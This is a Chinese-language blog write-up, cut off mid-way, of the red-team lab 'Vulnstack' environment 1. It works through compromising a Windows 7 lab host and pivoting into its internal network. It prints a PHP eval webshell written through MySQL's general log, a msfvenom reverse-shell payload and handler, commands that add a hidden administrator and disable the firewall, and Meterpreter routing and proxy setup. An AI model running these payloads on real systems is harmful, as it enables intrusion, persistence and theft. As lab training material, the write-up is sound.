    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>红队实战系列，主要以真实企业环境为实例搭建一系列靶场，通过练习、视频教程、博客三位一体学习。另外本次实战完全模拟ATT&amp;CK攻击链路进行搭建，开成完整闭环。后续也会搭建真实APT实战环境，从实战中成长。关于环境可以模拟出各种各样实战路线，目前给出作者实战的一套攻击实战路线如下，虚拟机所有统一密码：hongrisec@2019。</p>
<a id="more"></a>
<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a><br>（没有百度云会员的我苦苦的下载了2天QAQ）</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><img src="/posts/1cb8ad01/2.png" class="" title="This is an 2 image">
<img src="/posts/1cb8ad01/1.png" class="" title="This is an 1 image">
<img src="/posts/1cb8ad01/3.png" class="" title="This is an 3 image">
<img src="/posts/1cb8ad01/4.png" class="" title="This is an 4 image">
<img src="/posts/1cb8ad01/5.png" class="" title="This is an 5 image">
<img src="/posts/1cb8ad01/6.png" class="" title="This is an 6 image">
<p>Windows 7有双网卡，也就是内外网IP<br>外网IP：192.168.54.x<br>内网IP：192.168.52.x<br>且此服务器存在yxcms<br>Windows 2008只有内网网卡<br>内网IP： 192.168.52.x<br>Win2k3只有内网网卡<br>内网IP：192.168.52.x<br>kali 也配置为外网IP:192.168.54.128</p>
<p>那么kali和win7就在同一网段，需要先那先win7在拿下win2008和win2k3</p>
<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>先扫描一下存活主机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">oot@</span>kali:~# nmap -sP <span class="number">192.168</span><span class="number">.54</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 03:51 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00017</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:C0:<span class="number">00</span>:<span class="number">01</span> (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00044</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.254</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.000046</span>s latency).</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:FE:<span class="number">9</span>A:C3 (VMware)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.128</span></span><br><span class="line">Host <span class="keyword">is</span> up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">27.78</span> seconds</span><br></pre></td></tr></table></figure>
<p>发现IP：192.168.54.129<br>扫描一下这个IP</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 05:16 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00041</span>s latency).</span><br><span class="line">All <span class="number">1000</span> scanned ports on <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span> are filtered</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">34.40</span> seconds</span><br></pre></td></tr></table></figure>
<p>我去80去哪了？靶机里看了一眼 80没开  还要我自己开。。。<br>c盘有个phpstudy 打开</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# nmap <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Starting Nmap <span class="number">7.80</span> ( https:<span class="comment">//nmap.org ) at 2020-03-05 05:27 EST</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">Host <span class="keyword">is</span> up (<span class="number">0.00037</span>s latency).</span><br><span class="line">Not shown: <span class="number">998</span> filtered ports</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   open  http</span><br><span class="line"><span class="number">3306</span>/tcp open  mysql</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">98</span>:<span class="number">9</span>F (VMware)</span><br></pre></td></tr></table></figure>
<p>好了 扫出80和3306端口<br>80端口就是web漏洞了<br>3306 mysql 有可能存在弱口令 一会试一下<br>先进入网页看看<br>phpstudy探针页面</p>
<img src="/posts/1cb8ad01/7.png" class="" title="This is an 7 image">
<p>存在一下信息</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">操作系统：windows <span class="number">7</span> 专业版</span><br><span class="line">服务器主机名：STU1</span><br><span class="line">网站绝对路径：C:/phpStudy/WWW</span><br><span class="line">服务器解译引擎：Apache/<span class="number">2.4</span><span class="number">.23</span> (Win32) OpenSSL/<span class="number">1.0</span><span class="number">.2</span>j PHP/<span class="number">5.4</span><span class="number">.45</span></span><br></pre></td></tr></table></figure>
<p>正好探针下面有Mysql数据库连接检测，那就试一下弱密</p>
<figure class="highlight xquery"><table><tr><td class="code"><pre><span class="line">账号<span class="built_in"> root</span></span><br><span class="line">密码<span class="built_in"> root</span></span><br></pre></td></tr></table></figure>
<img src="/posts/1cb8ad01/8.png" class="" title="This is an 8 image">
<p>对了。。。。这就很尴尬<br>继续往下做吧，多找点漏洞，也不能对不起2天的下载时间<br>用dirsearch扫一波目录</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">l</span><span class="selector-class">.php</span></span><br><span class="line"><span class="selector-tag">phpinfo</span><span class="selector-class">.php</span></span><br><span class="line"><span class="selector-tag">phpmyadmin</span></span><br></pre></td></tr></table></figure>
<p>扫出这三个，因为知道数据库密码和绝对路径，phpmyadmin可以直接上马<br>又换了个字典扫了一下还是没扫出来 就用phpmyadmin上马吧。。</p>
<img src="/posts/1cb8ad01/9.png" class="" title="This is an 9 image">
<p>MySQL限制了导入与导出的目录权限。只允许在规定的目录下才能导入<br>可以用phpmyadmin通过日志写入一句话木马试一下</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> <span class="keyword">VARIABLES</span> <span class="keyword">LIKE</span> <span class="string">'general_log%'</span></span><br></pre></td></tr></table></figure>
<img src="/posts/1cb8ad01/10.png" class="" title="This is an 10 image">
<p>日志功能是关闭的需要把他开启</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;</span><br></pre></td></tr></table></figure>
<p>修改日志文件保存位置</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="builtin-name">set</span> global <span class="attribute">general_log_file</span>=<span class="string">'C:/phpStudy/WWW/1.php'</span>;</span><br></pre></td></tr></table></figure>
<p>写入一句话木马（直接查找一句话木马就可以MySQL会把这句话记录到日志）</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">select '<span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[kill]);<span class="meta">?&gt;</span></span>'</span><br></pre></td></tr></table></figure>
<p>ok 成功上马 </p>
<img src="/posts/1cb8ad01/11.png" class="" title="This is an 11 image">
<p>使用蚁剑连接</p>
<img src="/posts/1cb8ad01/12.png" class="" title="This is an 12 image">
<p>连接上之后发现<code>yxcms</code>和<code>beifen.rar</code>文件<br>重新来过再看看有没有其他漏洞</p>
<img src="/posts/1cb8ad01/13.png" class="" title="This is an 13 image">
<p>把备份文件下载下来之后看到是yxcms1.2.1版本的再看看李梅有什么有用的</p>
<img src="/posts/1cb8ad01/14.png" class="" title="This is an 14 image">
<p>账号<code>admin</code>密码的md5值 去解密得出<code>949ba59abbe56e05</code><br>登录发现不对，再去备份文件里看一下</p>
<img src="/posts/1cb8ad01/15.png" class="" title="This is an 15 image">
<p>加东西了 在解密一下密码为<code>123456</code><br>账号密码都有了  那就登录</p>
<img src="/posts/1cb8ad01/16.png" class="" title="This is an 16 image">
<p>感觉这几个都有可能getshell</p>
<p>全局设置–&gt;前台模板–&gt;管理文件模板–&gt;随便找一个php文件编辑插马就可以了<br>用蚁剑进入虚拟终端信息收集一下</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">C:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW&gt; whoami</span><br><span class="line">god<span class="symbol">\a</span>dministrator</span><br></pre></td></tr></table></figure>
<p>管理员权限</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; netstat -ano</span><br><span class="line">活动连接</span><br><span class="line">  协议  本地地址          外部地址        状态           PID</span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">80</span>             <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">135</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">732</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">445</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1025</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">404</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1026</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">820</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1027</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">880</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1028</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">516</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">1029</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">508</span></span><br><span class="line">  TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">3306</span>           <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">2116</span></span><br><span class="line">  TCP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">139</span>    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">139</span>     <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">80</span>      <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span>:<span class="number">58669</span>     CLOSE_WAIT      <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">80</span>      <span class="number">192.168</span><span class="number">.54</span><span class="number">.1</span>:<span class="number">58713</span>     ESTABLISHED     <span class="number">1948</span></span><br><span class="line">  TCP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">139</span>     <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    [::]:<span class="number">80</span>                [::]:<span class="number">0</span>                 LISTENING       <span class="number">1948</span></span><br><span class="line">  TCP    [::]:<span class="number">135</span>               [::]:<span class="number">0</span>                 LISTENING       <span class="number">732</span></span><br><span class="line">  TCP    [::]:<span class="number">445</span>               [::]:<span class="number">0</span>                 LISTENING       <span class="number">4</span></span><br><span class="line">  TCP    [::]:<span class="number">1025</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">404</span></span><br><span class="line">  TCP    [::]:<span class="number">1026</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">820</span></span><br><span class="line">  TCP    [::]:<span class="number">1027</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">880</span></span><br><span class="line">  TCP    [::]:<span class="number">1028</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">516</span></span><br><span class="line">  TCP    [::]:<span class="number">1029</span>              [::]:<span class="number">0</span>                 LISTENING       <span class="number">508</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">68</span>             *:*                                    <span class="number">820</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">123</span>            *:*                                    <span class="number">100</span></span><br><span class="line">  UDP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">5355</span>           *:*                                    <span class="number">640</span></span><br><span class="line">  UDP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">137</span>    *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span>:<span class="number">138</span>    *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">137</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span>:<span class="number">138</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">137</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span>:<span class="number">138</span>     *:*                                    <span class="number">4</span></span><br><span class="line">  UDP    [::]:<span class="number">123</span>               *:*                                    <span class="number">100</span></span><br><span class="line">  UDP    [::]:<span class="number">5355</span>              *:*                                    <span class="number">640</span></span><br></pre></td></tr></table></figure>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; systeminfo</span><br><span class="line">主机名:           STU1</span><br><span class="line">OS 名称:          Microsoft Windows <span class="number">7</span> 专业版 </span><br><span class="line">OS 版本:          <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span></span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          成员工作站</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          <span class="number">00371</span><span class="number">-177</span><span class="number">-0000061</span><span class="number">-85693</span></span><br><span class="line">初始安装日期:     <span class="number">2019</span>/<span class="number">8</span>/<span class="number">25</span>, <span class="number">9</span>:<span class="number">54</span>:<span class="number">10</span></span><br><span class="line">系统启动时间:     <span class="number">2020</span>/<span class="number">3</span>/<span class="number">6</span>, <span class="number">9</span>:<span class="number">55</span>:<span class="number">47</span></span><br><span class="line">系统制造商:       VMware, Inc.</span><br><span class="line">系统型号:         VMware Virtual Platform</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 <span class="number">1</span> 个处理器。</span><br><span class="line">                  [<span class="number">01</span>]: Intel64 Family <span class="number">6</span> Model <span class="number">142</span> Stepping <span class="number">9</span> GenuineIntel ~<span class="number">2712</span> Mhz</span><br><span class="line">BIOS 版本:        Phoenix Technologies LTD <span class="number">6.00</span>, <span class="number">2019</span>/<span class="number">7</span>/<span class="number">29</span></span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+<span class="number">08</span>:<span class="number">00</span>)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     <span class="number">2</span>,<span class="number">047</span> MB</span><br><span class="line">可用的物理内存:   <span class="number">1</span>,<span class="number">238</span> MB</span><br><span class="line">虚拟内存: 最大值: <span class="number">4</span>,<span class="number">095</span> MB</span><br><span class="line">虚拟内存: 可用:   <span class="number">3</span>,<span class="number">199</span> MB</span><br><span class="line">虚拟内存: 使用中: <span class="number">896</span> MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               god.org</span><br><span class="line">登录服务器:       \\OWA</span><br><span class="line">修补程序:         安装了 <span class="number">4</span> 个修补程序。</span><br><span class="line">                  [<span class="number">01</span>]: KB2534111</span><br><span class="line">                  [<span class="number">02</span>]: KB2999226</span><br><span class="line">                  [<span class="number">03</span>]: KB958488</span><br><span class="line">                  [<span class="number">04</span>]: KB976902</span><br><span class="line">网卡:             安装了 <span class="number">6</span> 个 NIC。</span><br><span class="line">                  [<span class="number">01</span>]: Intel(R) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">                      连接名:      本地连接</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::c583:c68a:<span class="number">1fe6</span>:a72a</span><br><span class="line">                  [<span class="number">02</span>]: Bluetooth 设备(个人区域网)</span><br><span class="line">                      连接名:      Bluetooth 网络连接</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">03</span>]: TAP-Windows Adapter V9</span><br><span class="line">                      连接名:      本地连接 <span class="number">2</span></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">04</span>]: Microsoft Loopback Adapter</span><br><span class="line">                      连接名:      Npcap Loopback Adapter</span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: <span class="number">255.255</span><span class="number">.255</span><span class="number">.255</span></span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">169.254</span><span class="number">.129</span><span class="number">.186</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::b461:ccad:e30f:<span class="number">81</span>ba</span><br><span class="line">                  [<span class="number">05</span>]: TAP-Windows Adapter V9</span><br><span class="line">                      连接名:      本地连接 <span class="number">3</span></span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [<span class="number">06</span>]: Intel(R) PRO/<span class="number">1000</span> MT Network Connection</span><br><span class="line">                      连接名:      本地连接 <span class="number">4</span></span><br><span class="line">                      启用 DHCP:   是</span><br><span class="line">                      DHCP 服务器: <span class="number">192.168</span><span class="number">.54</span><span class="number">.254</span></span><br><span class="line">                      IP 地址</span><br><span class="line">                        [<span class="number">01</span>]: <span class="number">192.168</span><span class="number">.54</span><span class="number">.129</span></span><br><span class="line">                        [<span class="number">02</span>]: fe80::<span class="number">4</span>d9f:d019:<span class="number">7264</span>:<span class="number">7e9</span></span><br></pre></td></tr></table></figure>
<p>开启3389端口</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">" "</span>Server <span class="string">/v</span> fDenyTSConnections <span class="string">/t</span> REG_DWORD <span class="string">/d</span> 00000000 <span class="string">/f</span></span><br></pre></td></tr></table></figure>
<p>创建管理员用户</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">C:\phpStudy\WWW&gt; net<span class="built_in"> user </span>timor fuck!@#123-+ /add</span><br><span class="line">命令成功完成。</span><br><span class="line"> </span><br><span class="line">C:\phpStudy\WWW&gt; net localgroup administrators timor /add</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></table></figure>
<p>连接3389，连接失败设置了防火墙那么可以使用<code>netsh firewall set opmode disable</code>关闭</p>
<img src="/posts/1cb8ad01/18.png" class="" title="This is an 18 image">
<p>远程太卡了 还是命令行吧</p>
<h3 id="用cs来攻击"><a href="#用cs来攻击" class="headerlink" title="用cs来攻击"></a>用cs来攻击</h3><p>配置监听<br><a href="http://timorblog.cn/posts/431a3a09.html">http://timorblog.cn/posts/431a3a09.html</a><br>生成木马后上传到win7上<br>运行木马</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">C:<span class="symbol">\U</span>sers<span class="symbol">\A</span>dministrator<span class="symbol">\D</span>esktop&gt; artifact.exe</span><br></pre></td></tr></table></figure>
<img src="/posts/1cb8ad01/17.png" class="" title="This is an 17 image">
<p>连接上了 提权 关闭防火墙<br>提权使用cs自带的ms14-058<br>拿到system权限</p>
<h3 id="用msf攻击"><a href="#用msf攻击" class="headerlink" title="用msf攻击"></a>用msf攻击</h3><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="symbol">root@</span>kali:~# msfvenom -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.54</span><span class="number">.128</span> LPORT=<span class="number">4444</span> -f exe &gt; hello.exe</span><br></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">root@kali:~# msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.54.128</span><br><span class="line">lhost =&gt; 192.168.54.128</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 5555</span><br><span class="line">lport =&gt; 5555</span><br><span class="line">msf5 exploit(multi/handler) &gt; exploit -j</span><br><span class="line">msf5 exploit(multi/handler) &gt; [*] Sending stage (180291 bytes) <span class="keyword">to</span> 192.168.54.129</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.54.128:5555 -&gt; 192.168.54.129:1394) at 2020-03-06 01:08:01 -0500</span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions 1</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: GOD\Administrator</span><br><span class="line">meterpreter &gt; getsystem </span><br><span class="line"><span class="built_in">..</span>.got<span class="built_in"> system </span>via technique 1 (Named Pipe Impersonation (<span class="keyword">In</span> Memory/Admin)).</span><br><span class="line">meterpreter &gt; getuid </span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>

<h2 id="横向渗透"><a href="#横向渗透" class="headerlink" title="横向渗透"></a>横向渗透</h2><h3 id="添加路由挂代理"><a href="#添加路由挂代理" class="headerlink" title="添加路由挂代理"></a>添加路由挂代理</h3><h4 id="使用msf"><a href="#使用msf" class="headerlink" title="使用msf"></a>使用msf</h4><p>获取网段</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets  </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/<span class="built_in">auto</span>route.</span><br><span class="line">[!] Example: run post/multi/manage/<span class="built_in">auto</span>route OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.54</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure>
<p>添加路由</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> autoroute -s 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="builtin-name">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line">[*] Adding a<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0<span class="built_in">..</span>.</span><br><span class="line">[+] Added<span class="built_in"> route </span><span class="keyword">to</span> 192.168.52.0/255.255.255.0 via 192.168.54.129</span><br><span class="line">[*] Use the -p option <span class="keyword">to</span> list all active routes</span><br></pre></td></tr></table></figure>
<p>查看路由</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="builtin-name">run</span> autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: <span class="builtin-name">run</span> post/multi/manage/autoroute <span class="attribute">OPTION</span>=value [<span class="built_in">..</span>.]</span><br><span class="line"></span><br><span class="line">Active<span class="built_in"> Routing </span>Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.52.0       255.255.255.0      Session 6</span><br></pre></td></tr></table></figure>
<p>扫描网段的存活主机</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=<span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] ARP Scanning <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">26</span>:<span class="number">22</span>:f7 (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.143</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:af:<span class="number">98</span>:<span class="number">95</span> (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.141</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:<span class="number">5</span>c:<span class="number">5</span>b:dc (VMware, Inc.)</span><br><span class="line">[+]     IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.255</span> MAC <span class="number">00</span>:<span class="number">0</span>c:<span class="number">29</span>:af:<span class="number">98</span>:<span class="number">95</span> (VMware, Inc.)</span><br></pre></td></tr></table></figure>
<p>退出</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">meterpreter</span> &gt; <span class="keyword">background </span></span><br><span class="line">[*] <span class="keyword">Backgrounding </span>session <span class="number">6</span>...</span><br></pre></td></tr></table></figure>
<p>添加代理</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5 </span><br><span class="line">msf5 auxiliary(server/socks5) &gt; <span class="builtin-name">set</span> srvport 1080</span><br><span class="line">srvport =&gt; 1080</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 7.</span><br><span class="line"></span><br><span class="line">[*] Starting the socks5<span class="built_in"> proxy </span>server</span><br><span class="line">[*] Stopping the socks5<span class="built_in"> proxy </span>server</span><br></pre></td></tr></table></figure>
<p>修改proxychains配置</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">vi</span> <span class="string">/etc/proxychains.conf</span></span><br><span class="line"><span class="comment">#在文件的底部添加</span></span><br><span class="line"><span class="string">socks5</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br></pre></td></tr></table></figure>
<p>测试一下是否成功</p>
